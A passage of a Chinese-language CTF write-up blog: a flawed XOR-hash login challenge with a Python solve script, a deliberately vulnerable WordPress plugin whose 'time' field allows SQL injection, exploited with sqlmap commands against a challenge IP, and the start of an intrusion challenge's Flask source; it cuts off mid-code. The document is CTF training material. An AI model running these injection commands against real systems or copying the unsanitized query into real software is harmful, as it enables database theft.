EoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>
        
<span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span>
                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>
                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>
                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>
                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>
                        <span class="token punctuation">&#125;</span>
                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;
users中存在用户名“admin”密码也为“admin”，表面上看需要传入的参数也为admin&#x2F;admin。

</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png" alt="image-20230907210222817" loading="lazy"></p>
<p>继续分析源码可以发现eval()语句将base64.b64encode覆写为base64.b64decode</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>
        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>
    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token comment">#当传入的参数items为2个时该函数等价于求两个参数的异或值并返回，所以当两个参数相等时不管该参数为何值，返回值都为0</span>
<span class="token comment">#而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</span>
</code></pre>

<p><strong>而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</strong></p>
<p>接下来编写脚本即可把构造的json数据base64编码五次</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64

url <span class="token operator">=</span> <span class="token string">"http://localhost:64817/login"</span>
username <span class="token operator">=</span> <span class="token string">"\"1\""</span>
password <span class="token operator">=</span> <span class="token string">"1"</span>
jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>

<h1 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h1><p>CHALLENGE: 出去旅游的心海<br>DESCRIPTION: 欢迎来到心海新建的博客！正值假期期间，她抓紧时间出去旅游放松一下，看看她最近都在研究什么？<br><a target="_blank" rel="noopener" href="http://101.42.178.83:7770/">http://101.42.178.83:7770/</a></p>
<p>查看源码页面可发现一个php文件链接</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png" alt="image-20230922215913893" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/</span>

<span class="token comment">// 不许偷看！这些代码我还在调试呢！</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 加载数据库配置，暂时用硬编码绝对路径</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// 数据库用户名</span>
<span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// 数据库密码</span>
<span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// 数据库名称</span>
<span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// 数据库主机</span>

<span class="token comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span>
<span class="token comment">// 这些是临时的代码</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 检查连接是否成功</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据库连接失败: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span>

<span class="token comment">// 执行插入</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 检查插入是否成功</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入成功'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入失败: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 关闭数据库连接</span>
<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//gpt真好用</span></span></code></pre>

<p>根据测试发现time存在报错注入</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png" alt="image-20230922220234166" loading="lazy"></p>
<p>sqlmap一把梭</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">--dbs</span>  <span class="token parameter variable">--batch</span>

python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">-D</span> wordpress <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span>

python3 sqlmap.py  <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span>  <span class="token parameter variable">-D</span> wordpress  <span class="token parameter variable">-T</span> secret_of_kokomi <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span>

</code></pre>

<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png" alt="image-20230922222050154" loading="lazy"></p>
<h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>CHALLENGE: moeworld<br>DESCRIPTION: 你已经学会了1+1&#x3D;2，接下来尝试真实的渗透吧~<br>解压密码为“出去旅游的心海”的flag</p>
<p>下载附件解压得到如下文件</p>
<pre class="language-none"><code class="language-none">本题你将扮演**红队**的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag

题目环境：http:&#x2F;&#x2F;47.115.201.35:8000&#x2F;

在本次公共环境中渗透测试中，希望你**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**

**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**

hint.zip 密码请在拿到外网靶机后访问根目录下的**readme**，完成条件后获取

环境出现问题，请第一时间联系出题人**xlccccc**

对题目有疑问，也可随时询问出题人</code></pre>

<p>根据题目来说看来需要内网遨游了</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png" alt="image-20230922222659454" loading="lazy"></p>
<p>一个python搭建的网页这是该网站源码</p>
<p><strong>app.py</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> curses <span class="token keyword">import</span> flash
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash
<span class="token keyword">import</span> os
<span class="token keyword">import</span> dataSql
<span class="token keyword">import</span> datetime
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>template_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static/templates"</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>static_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
            session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"username or password incorrect"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("You have already logged in.");window.location.href="/index";&lt;/script>'''</span>

<span class="token comment"># change the password</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">foundpwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'changepwd.html'</span><span class="token punctuation">)</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
    oldPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'oldPassword'</span><span class="token punctuation">]</span>
    newPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'newPassword'</span><span class="token punctuation">]</span>
    a <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>changePassword<span class="token punctuation">(</span>username<span class="token punctuation">,</span> oldPassword<span class="token punctuation">,</span> newPassword<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    change successfully
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">)</span>


<span class="token comment"># register for enter the message board</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
